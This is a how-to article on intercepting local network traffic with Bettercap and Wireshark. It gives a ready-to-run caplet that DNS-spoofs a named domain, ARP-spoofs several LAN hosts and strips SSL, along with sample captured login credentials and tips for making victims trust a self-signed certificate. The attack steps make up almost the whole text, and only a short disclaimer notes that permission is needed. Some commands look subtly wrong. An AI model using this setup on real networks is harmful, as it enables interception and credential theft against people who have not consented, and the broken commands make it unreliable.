
# **Using Wireshark, Bettercap, and a Local Server for DNS Spoofing**

This article provides a detailed guide on how to **use Wireshark, Bettercap, and a local HTTPS server** to perform **DNS spoofing** and monitor network traffic. You'll learn how to redirect traffic from a target device to a **local server** using DNS spoofing, ARP spoofing, and SSL stripping.

---

## **Setup Overview**

### Tools Used:
- **Bettercap**: For DNS spoofing, ARP spoofing, and SSL stripping.
- **Wireshark**: To monitor and analyze network traffic.
- **Local HTTPS Server**: To serve content over HTTPS.
  
**Goal**: Redirect requests for `cloudmateria.com` to a local HTTPS server and capture relevant data.

---

## **Step 1: Set Up the Local HTTPS Server**

1. **Generate a Self-Signed SSL Certificate**:
   ```bash
   openssl req -newkey rsa:2048 -nodes -keyout mykey.key -x509 -days 365 -out mycert.crt
   ```

2. **Combine the Key and Certificate**:
   ```bash
   cat mycert.crt mykey.key > mycert.pem
   ```

3. **Run the Local HTTPS Server**:
   ```bash
   python3 -m http.server 443 --certfile mycert.pem
   ```

   This starts a **local HTTPS server** on port **443**, ready to serve content.

---

## **Step 2: Configure Bettercap for DNS and ARP Spoofing**

Create a Bettercap **caplet script** called **`spoof.cap`** with the following content:

```plaintext
set dns.spoof.all false
set dns.spoof.domains cloudmateria.com
set dns.spoof.address 192.168.1.10
dns.spoof on

set arp.spoof.targets 192.168.1.2,192.168.1.14,192.168.1.24,192.168.1.6,192.168.1.11
arp.spoof on
net.probe on

https.proxy on
set https.proxy.sslstrip true
```

This script will:
- **Redirect requests** for `cloudmateria.com` to your local server at **192.168.1.10**.
- **Spoof ARP responses** to reroute traffic from multiple devices.
- **Enable HTTPS proxy with SSL stripping** to intercept and downgrade HTTPS traffic to HTTP.

---

### **How to Load and Run the Caplet in Bettercap**

1. **Open a terminal** and launch Bettercap:
   ```bash
   sudo bettercap -iface eth0
   ```

2. **Load and Run the Caplet**:
   ```bash
   caplet /path/to/spoof.cap
   ```

This starts DNS spoofing, ARP spoofing, and SSL stripping.

---

## **Step 3: Monitor Traffic with Wireshark**

1. **Start Wireshark** and select the network interface (e.g., `eth0` or `wlan0`).
2. **Apply the Filter** to View HTTPS Traffic:
   ```plaintext
   ip.addr == 192.168.1.2 and tcp.port == 443
   ```
3. **Start Capture** and generate traffic from the target devices.

### **Inspect Downgraded Traffic**

With **SSL stripping** enabled, HTTPS connections to `cloudmateria.com` will be downgraded to **HTTP**, and you can capture the unencrypted traffic.

---

## **Step 4: Test DNS Spoofing on the Target Device**

1. On one of the **target devices**:
   - Open a browser and visit `https://cloudmateria.com`.

2. The browser will be **redirected to your local HTTPS server** at **192.168.1.10**.

3. **Wireshark** will display the captured packets, including:
   - DNS requests and responses.
   - HTTP requests and responses (after SSL stripping).
   - Any **user input** or form data submitted via the website.

---

## **Expected Wireshark Output**

You should see:
- **DNS Spoofing Results**:
   ```plaintext
   DNS 192.168.1.2 → 192.168.1.10 A cloudmateria.com
   ```
- **ARP Spoofing Packets**:
   ```plaintext
   ARP Who has 192.168.1.10? Tell 192.168.1.2
   ```
- **HTTP Requests (after SSL Stripping)**:
   ```plaintext
   GET / HTTP/1.1
   Host: cloudmateria.com
   ```
- **Captured User Data**:
   If the spoofed site contains an **input form**, the submitted data will appear in the captured HTTP traffic:
   ```plaintext
   POST /login HTTP/1.1
   Host: cloudmateria.com
   Content-Type: application/x-www-form-urlencoded

   username=admin&password=12345
   ```

---

## **Troubleshooting**

1. **DNS Cache Issue**:  
   Flush the DNS cache on the target device to ensure it queries the fake DNS server:
   - **Windows**:
     ```bash
     ipconfig /flushdns
     ```
   - **Linux/macOS**:
     ```bash
     sudo systemd-resolve --flush-caches
     ```

2. **Browser Warnings**:  
   If the browser warns about a certificate error, **install and trust your self-signed certificate** on the target device.

3. **No HTTPS Traffic Visible**:  
   - Verify that **SSL stripping** is working.
   - Make sure the **target device** is on the same network and is sending traffic through your machine.

---

## **Legal and Ethical Considerations**

DNS spoofing and ARP spoofing are **intrusive techniques** and should only be used with **explicit permission** in **controlled environments**. Unauthorized interception of network traffic is illegal in many jurisdictions.

---

## **Conclusion**

By combining **Wireshark**, **Bettercap**, and a **local HTTPS server**, you can successfully perform DNS spoofing and capture traffic, including **downgraded HTTPS traffic**. This setup is useful for **ethical hacking, penetration testing, or network analysis**. Ensure you understand the **legal boundaries** when using these techniques and always conduct testing in environments where you have permission.
